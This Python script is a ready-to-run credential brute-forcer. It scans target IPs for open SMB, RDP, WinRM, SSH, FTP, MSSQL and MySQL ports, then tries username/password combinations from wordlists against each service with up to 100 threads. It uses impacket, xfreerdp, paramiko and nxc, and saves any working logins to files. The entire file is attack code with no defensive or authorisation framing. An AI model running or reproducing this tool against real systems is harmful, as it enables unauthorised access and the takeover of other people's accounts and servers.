#!/usr/bin/env python3

import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

import argparse
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import subprocess
import requests
from requests_ntlm import HttpNtlmAuth
import paramiko
from ftplib import FTP
import sys
import datetime
import os

log_filename = f"brute-output-{datetime.datetime.now().strftime('%Y%m%d-%H%M%S')}.txt"

class TeeOutput:
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log = open(filename, "a", buffering=1)

    def write(self, message):
        self.terminal.write(message)
        if "[+]" in message or message.startswith("[=") or message.startswith("[\n"):
            self.log.write(message)

    def flush(self):
        self.terminal.flush()
        self.log.flush()

sys.stdout = TeeOutput(log_filename)
sys.stderr = sys.stdout

GREEN = "\033[32m"
RED = "\033[31m"
RESET = "\033[0m"

max_threads = 100

ports = {
    'smb': 445,
    'rdp': 3389,
    'winrm': 5985,
    'ssh': 22,
    'ftp': 21,
    'mssql': 1433,
    'mysql': 3306
}

def is_port_open(ip, port, timeout=2):
    try:
        sock = socket.create_connection((ip, port), timeout)
        sock.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def load_users(users_file):
    with open(users_file, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def load_passwords(passwords_file):
    with open(passwords_file, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def try_login_smb(username, password, target_ip):
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(target_ip, target_ip, sess_port=445, timeout=3)
        conn.login(username, password)
        conn.logoff()
        return True
    except Exception:
        return False

def try_login_rdp(username, password, target_ip):
    payload = [
        'xfreerdp', f'/u:{username}', f'/v:{target_ip}', f'/p:{password}',
        '/size:90%', '/clipboard', '/cert:ignore', '/auth-only', '/timeout:5000',
    ]
    result = subprocess.run(payload, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return result.returncode == 0

def try_login_winrm(username, password, target_ip):
    url = f'http://{target_ip}:5985/wsman'
    try:
        response = requests.post(url, auth=HttpNtlmAuth(username, password), timeout=5, verify=False)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def try_login_ssh(username, password, target_ip):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, port=22, username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False, banner_timeout=5)
        client.close()
        return True
    except Exception:
        return False

def try_login_ftp(username, password, target_ip):
    try:
        ftp = FTP()
        ftp.connect(target_ip, 21, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False

def try_login_mssql(username, password, target_ip):
    try:
        cmd = [
            "nxc", "mssql",
            target_ip,
            "-u", username,
            "-p", password
        ]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=10, text=True)
        output = result.stdout.lower()
        return "[+]" in output or "success" in output
    except Exception:
        return False

def try_login_mysql(username, password, target_ip):
    try:
        import pymysql
        conn = pymysql.connect(host=target_ip, user=username, password=password, port=3306, connect_timeout=5)
        conn.close()
        return True
    except Exception:
        return False

def attempt_login(username, password, service, target_ip):
    if service == 'smb': return try_login_smb(username, password, target_ip)
    if service == 'rdp': return try_login_rdp(username, password, target_ip)
    if service == 'winrm': return try_login_winrm(username, password, target_ip)
    if service == 'ssh': return try_login_ssh(username, password, target_ip)
    if service == 'ftp': return try_login_ftp(username, password, target_ip)
    if service == 'mssql': return try_login_mssql(username, password, target_ip)
    if service == 'mysql': return try_login_mysql(username, password, target_ip)
    return False

def brute_force(target_ip, service, users, passwords, stop_on_success):
    combinations = [(u, p) for u in users for p in passwords]
    total_attempts = len(combinations)
    attempt_counter = 0
    found = threading.Event()
    lock = threading.Lock()

    threads = max_threads
    print(f"\n[*] Starting {service.upper()} brute-force against {target_ip} with {total_attempts} attempts using {threads} threads...")

    def worker(username, password):
        nonlocal attempt_counter
        if stop_on_success and found.is_set(): return
        success = attempt_login(username, password, service, target_ip)
        with lock:
            if stop_on_success and found.is_set(): return
            attempt_counter += 1
            percent = (attempt_counter / total_attempts) * 100
            print(f"[*] Attempt {attempt_counter}/{total_attempts} ({percent:.1f}%): {username}:{password}", end='\r')
            if success:
                print(f"\n{GREEN}[+]{RESET} {target_ip} - {service.upper()} login: {username}:{password}", flush=True)
                with open(f'found_{service}.txt', 'a') as f:
                    f.write(f"{target_ip} - {username}:{password}\n")
                if stop_on_success: found.set()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, u, p) for u, p in combinations]
        for future in futures:
            if stop_on_success and found.is_set(): break
            future.result()

    print()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Flexible Brute-Forcer")
    parser.add_argument('--ip', help="Single target IP address")
    parser.add_argument('--tf', help="File with list of target IPs")
    parser.add_argument('--svc', choices=ports.keys(), help="Service to brute-force")
    parser.add_argument('--all', action='store_true', help="Brute-force all supported services")
    parser.add_argument('-U', '--userfile', default='users.txt', help="Username file")
    parser.add_argument('-u', '--username', help="Single username")
    parser.add_argument('-P', '--passfile', default='passwords.txt', help="Password file")
    parser.add_argument('-p', '--password', help="Single password")
    parser.add_argument('--stop-on-success', action='store_true', help="Stop after first successful login")
    args = parser.parse_args()

    if not args.ip and not args.tf:
        print(f"{RED}[-] Specify either --ip or --tf (target file).{RESET}")
        exit(1)

    users = [args.username] if args.username else load_users(args.userfile)
    passwords = [args.password] if args.password else load_passwords(args.passfile)
    targets = [args.ip] if args.ip else [line.strip() for line in open(args.tf)]

    for target_ip in targets:
        selected_services = []
        if args.all:
            selected_services = [s for s, port in ports.items() if is_port_open(target_ip, port)]
        elif args.svc:
            if is_port_open(target_ip, ports[args.svc]): selected_services = [args.svc]
        else:
            print(f"{RED}[-] You must specify a service via --svc or use --all.{RESET}")
            exit(1)

        print(f"\n{'=' * 55}\n[{target_ip}] Open services: {', '.join(selected_services).upper()}\n{'=' * 55}")
        for service in selected_services:
            brute_force(target_ip, service, users, passwords, args.stop_on_success)

    print(f"\n[*] Output written to file: {log_filename}\n")
